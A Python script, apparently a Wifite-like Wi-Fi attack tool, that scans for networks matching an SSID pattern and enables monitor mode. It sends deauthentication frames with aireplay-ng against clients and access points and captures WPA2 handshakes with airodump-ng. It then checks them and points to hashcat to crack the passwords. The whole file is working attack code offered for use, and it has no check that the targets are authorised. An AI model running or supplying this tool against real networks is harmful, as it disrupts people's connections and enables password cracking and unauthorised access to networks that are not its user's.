#!/usr/bin/env python3

import os
import re
import time
import signal
import argparse
import subprocess
import threading
from datetime import datetime
from scapy.all import rdpcap, Dot11Beacon, Dot11, Dot11Auth, Dot11AssoReq, Dot11AssoResp, Dot11Deauth, Dot11EAPOL
from scapy.all import sniff, Dot11ProbeResp, RadioTap

# Colors for terminal output
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    GRAY = '\033[90m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'

class Network:
    def __init__(self, bssid, essid, channel, signal_strength=0, encryption="WPA2", wps=False):
        self.bssid = bssid.upper()
        self.essid = essid
        self.channel = channel
        self.signal_strength = signal_strength
        self.encryption = encryption
        self.wps = wps
        self.clients = set()  # Store connected client MAC addresses
        self.last_seen = time.time()
        self.handshake_captured = False
        self.deauth_attempts = 0
        self.max_deauth_attempts = 3  # Limit deauth attempts to prevent AP channel changes

    def add_client(self, client_mac):
        self.clients.add(client_mac.upper())
        self.last_seen = time.time()

    def update_signal(self, signal_strength):
        self.signal_strength = max(self.signal_strength, signal_strength)
        self.last_seen = time.time()

    def __str__(self):
        signal_bars = self.signal_bars()
        client_count = len(self.clients)
        wps_status = "✓" if self.wps else "✗"
        
        return f"{signal_bars} Ch {self.channel.rjust(2)} | {self.bssid} | {self.encryption} | WPS: {wps_status} | Clients: {client_count} | {self.essid}"

    def signal_bars(self):
        # Convert signal strength to bars display (▂▄▆█)
        if self.signal_strength >= -50:
            return "█████"  # Excellent (>= -50 dBm)
        elif self.signal_strength >= -60:
            return "████░"  # Good (-60 to -50 dBm)
        elif self.signal_strength >= -70:
            return "███░░"  # Fair (-70 to -60 dBm)
        elif self.signal_strength >= -80:
            return "██░░░"  # Poor (-80 to -70 dBm)
        else:
            return "█░░░░"  # Very poor (< -80 dBm)

def parse_arguments():
    parser = argparse.ArgumentParser(description='Wi-Fi Pentesting Automation Script (Wifite-like)')
    parser.add_argument('-i', '--interface', type=str, required=True, help='Wireless interface in monitor mode')
    parser.add_argument('-p', '--pattern', type=str, required=True, help='SSID pattern to search for (e.g. "name wifi")')
    parser.add_argument('-t', '--timeout', type=int, default=300, help='Timeout in seconds for scanning each network (default 300)')
    parser.add_argument('-o', '--output-dir', type=str, default='captures', help='Directory to save captures')
    parser.add_argument('-s', '--scan-time', type=int, default=30, help='Initial scanning time in seconds (default 30)')
    parser.add_argument('--min-signal', type=int, default=-80, help='Minimum signal strength to target (default -80 dBm)')
    return parser.parse_args()

def check_requirements():
    """Check if all required tools are installed."""
    tools = ['airmon-ng', 'airodump-ng', 'aireplay-ng']
    
    for tool in tools:
        try:
            subprocess.check_output(['which', tool], stderr=subprocess.STDOUT)
        except subprocess.CalledProcessError:
            print(f"{Colors.FAIL}[!] Required tool {tool} not found. Please install aircrack-ng suite.{Colors.ENDC}")
            return False
    
    # Check if running as root
    if os.geteuid() != 0:
        print(f"{Colors.FAIL}[!] This script must be run as root.{Colors.ENDC}")
        return False
    
    return True

def check_monitor_mode(interface):
    """Check if interface is in monitor mode."""
    try:
        output = subprocess.check_output(['iwconfig', interface], stderr=subprocess.STDOUT).decode('utf-8')
        if 'Mode:Monitor' in output:
            return True
        else:
            print(f"{Colors.WARNING}[!] Interface {interface} is not in monitor mode.{Colors.ENDC}")
            choice = input(f"{Colors.WARNING}[?] Would you like to put it in monitor mode? (y/n): {Colors.ENDC}")
            if choice.lower() == 'y':
                # Try to put interface in monitor mode
                print(f"{Colors.BLUE}[*] Enabling monitor mode on {interface}...{Colors.ENDC}")
                subprocess.run(['airmon-ng', 'check', 'kill'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                subprocess.run(['airmon-ng', 'start', interface], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                
                # Check if interface name changed (some drivers add 'mon' suffix)
                output = subprocess.check_output(['iwconfig'], stderr=subprocess.STDOUT).decode('utf-8')
                for line in output.split('\n'):
                    if 'Mode:Monitor' in line:
                        new_interface = line.split()[0]
                        print(f"{Colors.GREEN}[+] Monitor mode enabled on {new_interface}{Colors.ENDC}")
                        return new_interface
                
                # If original interface is now in monitor mode
                output = subprocess.check_output(['iwconfig', interface], stderr=subprocess.STDOUT).decode('utf-8')
                if 'Mode:Monitor' in output:
                    print(f"{Colors.GREEN}[+] Monitor mode enabled on {interface}{Colors.ENDC}")
                    return interface
                    
                print(f"{Colors.FAIL}[!] Failed to enable monitor mode.{Colors.ENDC}")
                return False
            else:
                return False
    except subprocess.CalledProcessError:
        print(f"{Colors.FAIL}[!] Interface {interface} does not exist.{Colors.ENDC}")
        return False

def packet_handler(packet, networks_dict, pattern):
    """Process captured packets to identify networks and clients."""
    pattern_regex = re.compile(pattern.replace(' ', '.*?'), re.IGNORECASE)
    
    # Extract signal strength if available
    signal_strength = None
    if packet.haslayer(RadioTap):
        signal_strength = -(256-packet[RadioTap].dBm_AntSignal) if hasattr(packet[RadioTap], 'dBm_AntSignal') else -100
    
    # Process beacon frames
    if packet.haslayer(Dot11Beacon):
        bssid = packet[Dot11].addr3
        
        # Extract SSID
        essid = ""
        if packet[Dot11Beacon].payload and hasattr(packet[Dot11Beacon].payload, 'info'):
            essid = packet[Dot11Beacon].payload.info.decode('utf-8', errors='ignore')
        
        # Skip hidden SSIDs
        if not essid:
            return
            
        # Check if the SSID matches our pattern
        if not pattern_regex.search(essid):
            return
            
        # Extract channel
        channel = "0"
        capability = packet[Dot11Beacon].payload
        while capability:
            if hasattr(capability, 'ID') and capability.ID == 3 and hasattr(capability, 'info'):
                channel = str(ord(capability.info))
                break
            capability = capability.payload if hasattr(capability, 'payload') else None
        
        # Extract encryption
        encryption = "WPA2"  # Default assumption
        
        # Extract WPS status (simplified detection)
        wps = False
        
        # Add or update network
        if bssid not in networks_dict:
            networks_dict[bssid] = Network(bssid, essid, channel, signal_strength, encryption, wps)
        else:
            networks_dict[bssid].essid = essid
            networks_dict[bssid].channel = channel
            if signal_strength:
                networks_dict[bssid].update_signal(signal_strength)
    
    # Process client connections or data packets
    elif packet.haslayer(Dot11) and packet.type == 2:  # Data frames
        if hasattr(packet[Dot11], 'addr1') and hasattr(packet[Dot11], 'addr2'):
            bssid = None
            client_mac = None
            
            # Extract BSSID and client MAC
            if packet[Dot11].FCfield & 0x1:  # To DS bit set (client to AP)
                bssid = packet[Dot11].addr1
                client_mac = packet[Dot11].addr2
            elif packet[Dot11].FCfield & 0x2:  # From DS bit set (AP to client)
                bssid = packet[Dot11].addr2
                client_mac = packet[Dot11].addr1
                
            # Add client to network if both bssid and client MAC are valid
            if bssid and client_mac and bssid in networks_dict:
                if client_mac != bssid and not client_mac.startswith('33:33:') and not client_mac.startswith('01:00:5e:'):
                    networks_dict[bssid].add_client(client_mac)

def scan_networks(interface, pattern, scan_time):
    """Actively scan for networks matching the pattern using scapy."""
    networks_dict = {}
    stop_sniffing = threading.Event()
    
    print(f"{Colors.BLUE}[*] Scanning for networks matching pattern: '{pattern}' for {scan_time} seconds...{Colors.ENDC}")
    print(f"{Colors.GRAY}    (Press Ctrl+C to stop scanning early){Colors.ENDC}")
    
    # Channel hopping function
    def channel_hopper():
        while not stop_sniffing.is_set():
            for channel in range(1, 14):
                if stop_sniffing.is_set():
                    break
                os.system(f"iwconfig {interface} channel {channel} > /dev/null 2>&1")
                time.sleep(0.5)
    
    # Start channel hopping in a separate thread
    hopper_thread = threading.Thread(target=channel_hopper)
    hopper_thread.daemon = True
    hopper_thread.start()
    
    # Progress bar and network display function
    def display_progress():
        start_time = time.time()
        while not stop_sniffing.is_set():
            elapsed = time.time() - start_time
            if elapsed >= scan_time:
                stop_sniffing.set()
                break
                
            remaining = scan_time - elapsed
            percent = int((elapsed / scan_time) * 100)
            bar_length = 30
            filled_length = int(bar_length * percent // 100)
            bar = '█' * filled_length + '░' * (bar_length - filled_length)
            
            # Clear screen
            os.system('clear')
            
            # Print header
            print(f"{Colors.HEADER}===== Wi-Fi Pentesting Automation Script ====={Colors.ENDC}")
            print(f"{Colors.BLUE}[*] Scanning for networks matching pattern: '{pattern}'{Colors.ENDC}")
            print(f"{Colors.GRAY}[*] Progress: [{bar}] {percent}% ({int(remaining)}s remaining){Colors.ENDC}")
            print(f"{Colors.GRAY}    (Press Ctrl+C to stop scanning early){Colors.ENDC}\n")
            
            # Print found networks table
            if networks_dict:
                print(f"{Colors.GREEN}Found {len(networks_dict)} networks matching pattern:{Colors.ENDC}")
                print(f"{Colors.CYAN}{'Signal':<8} {'Ch':<4} {'BSSID':<18} {'Security':<8} {'WPS':<6} {'Clients':<9} ESSID{Colors.ENDC}")
                print(f"{Colors.GRAY}{'─'*100}{Colors.ENDC}")
                
                for bssid, network in sorted(networks_dict.items(), key=lambda x: x[1].signal_strength, reverse=True):
                    print(f"{network}")
            else:
                print(f"{Colors.WARNING}No networks matching pattern found yet...{Colors.ENDC}")
                
            time.sleep(1)
    
    # Start display thread
    display_thread = threading.Thread(target=display_progress)
    display_thread.daemon = True
    display_thread.start()
    
    # Start sniffing
    try:
        sniff(
            iface=interface,
            prn=lambda pkt: packet_handler(pkt, networks_dict, pattern),
            stop_filter=lambda pkt: stop_sniffing.is_set(),
            store=0
        )
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Scanning interrupted by user.{Colors.ENDC}")
        stop_sniffing.set()
    
    # Make sure to stop channel hopping
    stop_sniffing.set()
    hopper_thread.join(timeout=1)
    display_thread.join(timeout=1)
    
    # Clear screen and display final results
    os.system('clear')
    print(f"{Colors.HEADER}===== Wi-Fi Pentesting Automation Script ====={Colors.ENDC}")
    print(f"{Colors.GREEN}[+] Scan completed. Found {len(networks_dict)} networks matching pattern: '{pattern}'{Colors.ENDC}\n")
    
    if networks_dict:
        print(f"{Colors.CYAN}{'Signal':<8} {'Ch':<4} {'BSSID':<18} {'Security':<8} {'WPS':<6} {'Clients':<9} ESSID{Colors.ENDC}")
        print(f"{Colors.GRAY}{'─'*100}{Colors.ENDC}")
        
        # Convert dict to sorted list based on signal strength
        networks_list = sorted(
            [network for bssid, network in networks_dict.items()], 
            key=lambda x: x.signal_strength, 
            reverse=True
        )
        
        for i, network in enumerate(networks_list):
            print(f"{Colors.YELLOW}[{i+1}]{Colors.ENDC} {network}")
    else:
        print(f"{Colors.WARNING}[!] No networks matching pattern '{pattern}' found.{Colors.ENDC}")
    
    return networks_list

def smart_deauth(interface, network, output_file):
    """Send deauthentication packets intelligently to avoid triggering channel changes."""
    # Set channel
    subprocess.run(['iwconfig', interface, 'channel', network.channel], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # If we have connected clients, target them specifically
    if network.clients:
        print(f"{Colors.BLUE}[*] Targeting {len(network.clients)} connected clients with directed deauth{Colors.ENDC}")
        
        # Use a gentler approach with fewer packets per client
        for client in list(network.clients)[:3]:  # Limit to first 3 clients
            if network.deauth_attempts >= network.max_deauth_attempts:
                print(f"{Colors.WARNING}[!] Reached maximum deauth attempts, stopping to avoid channel change{Colors.ENDC}")
                return
                
            # Send just 1 deauth packet per client, with small delay between
            cmd = [
                'aireplay-ng', '--deauth', '1', 
                '-a', network.bssid, 
                '-c', client, 
                interface
            ]
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            network.deauth_attempts += 1
            time.sleep(2)  # Add delay between deauths
    else:
        # Broadcast deauth, but be gentle (only if we haven't tried too many times)
        if network.deauth_attempts < network.max_deauth_attempts:
            print(f"{Colors.BLUE}[*] Sending broadcast deauth (attempt {network.deauth_attempts + 1}/{network.max_deauth_attempts}){Colors.ENDC}")
            cmd = ['aireplay-ng', '--deauth', '2', '-a', network.bssid, interface]
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            network.deauth_attempts += 1
        else:
            print(f"{Colors.WARNING}[!] Reached maximum deauth attempts, stopping to avoid channel change{Colors.ENDC}")

def capture_handshake(interface, network, output_dir, timeout):
    """Capture a handshake for a specific network."""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    essid_safe = network.essid.replace(' ', '_').replace('/', '_')
    output_file = f"{output_dir}/{essid_safe}_{timestamp}"
    
    print(f"{Colors.BOLD}{Colors.BLUE}[*] Attempting to capture handshake for {network.essid}{Colors.ENDC}")
    print(f"{Colors.BLUE}[*] Setting channel to {network.channel}{Colors.ENDC}")
    
    # Set channel
    subprocess.run(['iwconfig', interface, 'channel', network.channel], 
                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Start capture in the background
    capture_process = subprocess.Popen(
        ['airodump-ng', '--bssid', network.bssid, '--channel', network.channel, 
         '--write', output_file, '--output-format', 'pcap', interface],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )
    
    try:
        start_time = time.time()
        handshake_captured = False
        pcap_file = f"{output_file}-01.cap"
        
        # Monitor for handshake with progress display
        while time.time() - start_time < timeout:
            elapsed = time.time() - start_time
            percent = int((elapsed / timeout) * 100)
            
            # Send deauth every 10 seconds, using smart approach
            if int(elapsed) % 10 == 0:
                smart_deauth(interface, network, output_file)
            
            # Check for handshake every 5 seconds
            if int(elapsed) % 5 == 0 and os.path.exists(pcap_file):
                if verify_handshake(pcap_file, network.bssid):
                    handshake_captured = True
                    print(f"{Colors.GREEN}[+] Handshake captured for {network.essid}!{Colors.ENDC}")
                    break
            
            # Update progress display
            bar_length = 30
            filled_length = int(bar_length * percent // 100)
            bar = '█' * filled_length + '░' * (bar_length - filled_length)
            
            remaining = timeout - elapsed
            print(f"\r{Colors.GRAY}[*] Progress: [{bar}] {percent}% ({int(remaining)}s remaining) | "
                  f"Clients: {len(network.clients)} | Deauths: {network.deauth_attempts}{Colors.ENDC}", end='')
            
            time.sleep(1)
        
        print()  # New line after progress bar
        
        if not handshake_captured:
            print(f"{Colors.WARNING}[!] No handshake captured for {network.essid} after {timeout} seconds.{Colors.ENDC}")
            # Clean up capture file if no handshake was captured
            if os.path.exists(pcap_file):
                os.remove(pcap_file)
            return False, None
            
        return True, pcap_file
            
    finally:
        # Clean up processes
        if capture_process:
            capture_process.terminate()

def verify_handshake(pcap_file, bssid):
    """Verify if a PCAP file contains a valid handshake."""
    try:
        packets = rdpcap(pcap_file)
        eapol_count = 0
        has_msg_1 = False
        has_msg_2 = False
        
        # Convert BSSID to lowercase for comparison
        bssid = bssid.lower()
        
        for packet in packets:
            if packet.haslayer(Dot11EAPOL):
                # Check if packet is related to our target network
                dot11_layer = packet.getlayer(Dot11)
                if dot11_layer.addr1.lower() == bssid or dot11_layer.addr2.lower() == bssid:
                    eapol_count += 1
                    
                    # Check EAPOL message type (simplified)
                    if dot11_layer.addr2.lower() == bssid:  # From AP to client
                        has_msg_1 = True
                    elif dot11_layer.addr1.lower() == bssid:  # From client to AP
                        has_msg_2 = True
        
        # Need at least one message from AP and one from client for hashcat
        return has_msg_1 and has_msg_2 and eapol_count >= 2
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error verifying handshake: {e}{Colors.ENDC}")
        return False

def select_networks(networks):
    """Allow user to select which networks to target."""
    if not networks:
        return []
        
    while True:
        print(f"\n{Colors.BLUE}Select networks to target (comma-separated list or 'all'):{Colors.ENDC}")
        choice = input(f"{Colors.YELLOW}> {Colors.ENDC}")
        
        if choice.lower() == 'all':
            return networks
            
        if choice.lower() == 'q' or choice.lower() == 'quit':
            return []
            
        try:
            indices = [int(x) - 1 for x in choice.split(',')]
            selected = []
            
            for idx in indices:
                if 0 <= idx < len(networks):
                    selected.append(networks[idx])
                else:
                    print(f"{Colors.WARNING}[!] Invalid selection: {idx + 1}{Colors.ENDC}")
                    
            if selected:
                return selected
            else:
                print(f"{Colors.WARNING}[!] No valid networks selected. Try again.{Colors.ENDC}")
        except ValueError:
            print(f"{Colors.WARNING}[!] Invalid input. Please enter numbers separated by commas.{Colors.ENDC}")

def main():
    args = parse_arguments()
    
    print(f"{Colors.HEADER}===== Wi-Fi Pentesting Automation Script ====={Colors.ENDC}")
    
    # Check requirements
    if not check_requirements():
        return
    
    # Check if interface is in monitor mode
    interface_result = check_monitor_mode(args.interface)
    if not interface_result:
        return
    elif isinstance(interface_result, str) and interface_result != args.interface:
        # Interface name changed after enabling monitor mode
        args.interface = interface_result
    
    # Create output directory if it doesn't exist
    if not os.path.exists(args.output_dir):
        os.makedirs(args.output_dir)
    
    # Scan for networks matching the pattern
    networks = scan_networks(args.interface, args.pattern, args.scan_time)
    
    if not networks:
        return
    
    # Filter out networks with signal strength below threshold
    networks = [n for n in networks if n.signal_strength >= args.min_signal]
    
    if not networks:
        print(f"{Colors.WARNING}[!] No networks with signal strength above {args.min_signal} dBm.{Colors.ENDC}")
        return
    
    # Let user select networks to target
    selected_networks = select_networks(networks)
    
    if not selected_networks:
        print(f"{Colors.WARNING}[!] No networks selected.{Colors.ENDC}")
        return
    
    successful_captures = []
    
    # Attempt to capture handshakes for each selected network
    for network in selected_networks:
        success, pcap_file = capture_handshake(args.interface, network, args.output_dir, args.timeout)
        
        if success and pcap_file:
            successful_captures.append({
                'network': network,
                'pcap_file': pcap_file
            })
    
    # Summary
    print(f"\n{Colors.HEADER}===== Capture Summary ====={Colors.ENDC}")
    if successful_captures:
        print(f"{Colors.GREEN}[+] Successfully captured {len(successful_captures)} handshakes:{Colors.ENDC}")
        for capture in successful_captures:
            print(f"{Colors.GREEN}    - {capture['network'].essid} -> {capture['pcap_file']}{Colors.ENDC}")
            print(f"{Colors.GRAY}      BSSID: {capture['network'].bssid} | Channel: {capture['network'].channel}{Colors.ENDC}")
    else:
        print(f"{Colors.WARNING}[!] No handshakes were captured.{Colors.ENDC}")
    
    print(f"\n{Colors.BLUE}[*] Capture files ready for hashcat conversion.{Colors.ENDC}")
    print(f"{Colors.BLUE}[*] Recommended hashcat command: hashcat -m 22000 <capture.hccapx> <wordlist>{Colors.ENDC}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Script terminated by user.{Colors.ENDC}")